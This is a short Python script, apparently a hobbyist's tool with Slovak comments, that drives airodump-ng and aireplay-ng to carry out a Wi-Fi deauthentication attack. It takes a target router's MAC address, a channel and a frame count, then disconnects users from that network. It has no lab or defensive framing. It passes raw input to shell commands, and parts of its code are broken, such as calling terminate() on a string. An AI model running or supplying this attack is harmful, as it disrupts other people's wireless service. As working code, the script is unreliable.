# Code for deauth

# ------ [ Moduly ] ------ #
import time
import subprocess
import os
# ------ [ Farby ] ----- #
red = '\033[91m'
orange = '\033[38;5;208m'
purple = '\033[95m'
green = '\033[92m'
blue = '\033[94m'
magenta = '\033[35m'
yellow = '\033[93m'
cyan = '\033[96m'
reset = '\033[0m'

#def main():
#    # ------ [ INPUTY ] ------ #
#    RouterTargetMAC = input("Write MAC Addres for deauth : ")
#    SetChannel = input("Write Channel (need to be same as Target WiFi Channel) between 1 - 12 : ")
#    DeauthFrames = input(f"Set number for deauth frames to {RouterTargetMAC} : ")
#    
#    if DeauthFrames ==" " or DeauthFrames.isspace():
#        print(f"Setting Up Default Frames to {green}20{reset}")
#        DeauthFrames = "20"
#    time.sleep(1)
#    print(f"Changing Channel to {green}{SetChannel}{reset}")
#    Channel = subprocess.run(["sudo", "iwconfig", "wlan1", "channel", SetChannel], capture_output=True, text=True)
#
#    if Channel.returncode == 0:
#        time.sleep(1)
#        IWlistOutput = subprocess.run(["iwlist", "wlan1", "channel"], capture_output=True, text=True)
#
#        if IWlistOutput.stdout and f"(Channel {SetChannel})" in IWlistOutput.stdout:
#
#            print(f"Starting deauth attack on {RouterTargetMAC} MAC Address ...\n")
#            deauth = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", DeauthFrames, RouterTargetMAC, "wlan1"],stderr=subprocess.PIPE)
#            #time.sleep(1)
#            #print("! Time OUT ! Cancelled ...")
#            if os.system(deauth):
#               print("Still in process...")
#            else:
#               print("Cancelled ...")
#        else:
#            print("Some error occurred with check if is correct Channel as set channel")


def main():    #------------ FUNGUJE TOOOO KONECNEEE ------------#

    time.sleep(1)
    WiFiDump = f"sudo airodump-ng wlan1"
    subprocess.run(WiFiDump, shell=True)
    time.sleep(10)
    WiFiDump.terminate()

    RouterTargetMAC = str(input("Write MAC Address for deauth: "))
    SetChannel = str(input("Write Channel (needs to be the same as the Target WiFi Channel) between 1 - 14: "))
    DeauthFrames = str(input(f"Set the number of deauth frames for {RouterTargetMAC}: "))
 
#   Path for change Channel to same as using Target WiFi
    IwCommand = f"sudo iwconfig wlan1 channel {SetChannel}"
    subprocess.run(IwCommand, shell=True)
#   Path for Deauth - Disconnect users from Speciffic WiFi MAC Address
    command = f"sudo aireplay-ng --deauth {DeauthFrames} -a {RouterTargetMAC} wlan1"
    subprocess.run(command, shell=True)

    while True:
        GoAgain = input("Do you want to send Deauth frames again ? [Y/ N] ")
        if GoAgain =="y":
            continue
        else:
            print("Cancelling ... BB")
            break
